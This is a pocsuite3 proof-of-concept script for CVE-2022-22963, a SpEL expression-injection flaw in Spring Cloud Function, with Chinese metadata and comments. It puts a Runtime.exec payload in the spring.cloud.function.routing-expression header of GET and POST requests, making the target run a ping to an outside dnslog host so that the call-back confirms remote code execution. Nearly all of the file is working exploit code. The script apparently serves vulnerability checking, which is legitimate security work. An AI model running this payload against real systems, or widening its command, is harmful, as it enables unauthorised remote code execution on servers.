from pocsuite3.api import Output, POCBase, register_poc, requests
from urllib.parse import urlparse


class SpringCloudFunction(POCBase):
    vulID = 'CVE-2022-22963 | SSV-99478'  # 漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = 'v1.0'  # PoC版本，默认为1
    author = ['wyunan']  # 此PoC作者
    vulDate = '2022-03-27'  # 漏洞公开日期
    createDate = '2022-04-06'  # 编写PoC日期
    updateDate = '2022-04-06'  # 更新PoC日期，默认与createDate一样
    references = ['https://github.com/spring-cloud/spring-cloud-function']  # 漏洞地址来源，0day不写
    name = 'CVE-2022-22963-SpingCloudFunction Rce漏洞检测插件'  # PoC名称
    appPowerLink = 'https://github.com/spring-cloud/spring-cloud-function'  # 漏洞产商主页
    appName = 'Spring Cloud Function'  # 漏洞应用名称
    appVersion = '''
    3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
                '''  # 漏洞影响版本
    vulType = 'SPEL表达式注入'  # 漏洞类型
    desc = '''
    Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。
由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。
    '''  # 在漏洞描述填写
    fixDesc = '''
    https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
    '''  # 修复建议
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''通过pip安装 pocsuite3 库，写入目标URL，通过该脚本检测'''  # 在PoC用法描述填写

    # MyDNSlog改成你的ceye地址，如果后续还想更精确的查看是否确实存在该漏洞，则可在该dnslog平台上查看记录。
    MyDNSlog = "xxx.ceye.io"
    init_poc_key = '''spring.cloud.function.routing-expression'''
    init_poc_value = '''T(java.lang.Runtime).getRuntime().exec(\"ping %s")'''

    def _gen_payload(self, init_payload: str, host: str) -> (str, str):
        path = str(host) + '.' + self.MyDNSlog
        payload = init_payload % path
        return payload, path

    def _verify(self):
        result = {}
        try:
            url = self.url
            host = urlparse(url).hostname
            poc_key = self.init_poc_key
            poc_value, path = self._gen_payload(self.init_poc_value, host)
            headers = self.headers
            headers[poc_key] = poc_value
            # GET请求
            res1 = requests.get(url, headers=headers, allow_redirects=False, verify=False)
            # 如果的dnslog有接口可以验证请求，返回是否存在该dns记录，则在此处加dns判断。没有的话去dnslog平台看看有没有日志即可。
            # ......

            # POST请求
            data = "test=123"
            res2 = requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False)
            # 如果的dnslog有接口可以验证请求，返回是否存在该dns记录，则在此处加dns判断。没有的话去dnslog平台看看有没有日志即可。
            # ......
            result['VulResult'] = "去dnslog上查看是否有日志记录，如果有，则存在该漏洞"

            return self.parse_output(result)

        except Exception as e:
            print("%s" % e)
            raise e

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(SpringCloudFunction)
